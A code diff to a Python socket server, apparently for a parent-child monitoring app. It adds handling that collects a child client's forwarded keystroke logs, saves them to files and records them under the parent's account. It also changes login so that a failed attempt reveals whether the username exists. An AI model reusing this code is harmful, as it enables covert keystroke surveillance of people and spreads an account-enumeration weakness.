@@ -1,10 +1,13 @@
+# server.py
 import socket
 import threading
+import tools_no_encryption
+import os
+import datetime
 from db_manager import DatabaseManager
 from create_tables import create_all_tables
 from constants import IP, PORT
 from encrypt import Encryption
-import tools_no_encryption
 
 class Server:
     def __init__(self):
@@ -12,6 +15,7 @@ class Server:
         self.encryptor = Encryption()
         self.clients = {}  # client_id -> socket
         self.lock = threading.Lock()
+        self.clients_logs = {}  # child_id -> list[str]
 
         try:
             if "clients" not in self.db.show_tables():
@@ -43,15 +47,21 @@ class Server:
                 if command == "LOGIN":
                     username, password = parts[1], parts[2]
                     password_hash = tools_no_encryption.get_hash_value(password)
-                    user = self.db.get_rows_with_value("clients", "client_username", username)
+                    users = self.db.get_rows_with_value("clients", "client_username", username)
 
-                    if not user or user[0][4] != password_hash:
+                    if not users:
                         self.encryptor.send_encrypted_message(client_socket, "LOGIN_FAIL")
                         continue
+                    
+                    user = users[0]
 
-                    client_id = user[0][0]
-                    role = user[0][5]
-                    sibling_id = user[0][6]
+                    if user[4] != password_hash:
+                        self.encryptor.send_encrypted_message(client_socket, "LOGIN_FAIL|Wrong password")
+                        continue
+
+                    client_id = user[0]
+                    role = user[5]
+                    sibling_id = user[6]
 
                     with self.lock:
                         self.clients[client_id] = client_socket
@@ -85,10 +95,35 @@ class Server:
                     self.encryptor.send_encrypted_message(client_socket, f"REGISTER_OK|{new_user_id}")
 
                 elif command == "FORWARD":
+                    payload = request[len("FORWARD|"):]
+                    if payload.startswith("KEYLOG_START"):
+                        if sibling_id is not None:
+                            self.clients_logs[sibling_id] = []
+                    elif payload.startswith("KEYLOG_DATA|"):
+                        if len(payload.split("|", 1)) > 1:
+                            data = payload.split("|", 1)[1]
+                            if client_id in self.clients_logs:
+                                self.clients_logs[client_id].append(data)
+                    elif payload.startswith("KEYLOG_STOP"):
+                        if sibling_id in self.clients_logs and self.clients_logs[sibling_id]:
+                            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                            filename = f"log_{sibling_id}_{timestamp}.txt"
+                            full_log = "".join(self.clients_logs[sibling_id])
+                            
+                            # Save with encoding safety
+                            with open(filename, "w", encoding="utf-8", errors="replace") as f:
+                                f.write(full_log)
+
+                            self.db.insert_row(
+                                "keylogs",
+                                "(keylog_parent_id, keylog_child_id, keylog_path_name)",
+                                "(%s, %s, %s)",
+                                (client_id, sibling_id, filename)
+                            )
+                            del self.clients_logs[sibling_id]
                     with self.lock:
                         if sibling_id and sibling_id in self.clients:
                             target_socket = self.clients[sibling_id]
-                            payload = request[len("FORWARD|"):]
                             self.encryptor.send_encrypted_message(target_socket, payload)
 
                 elif command == "LOGOUT":
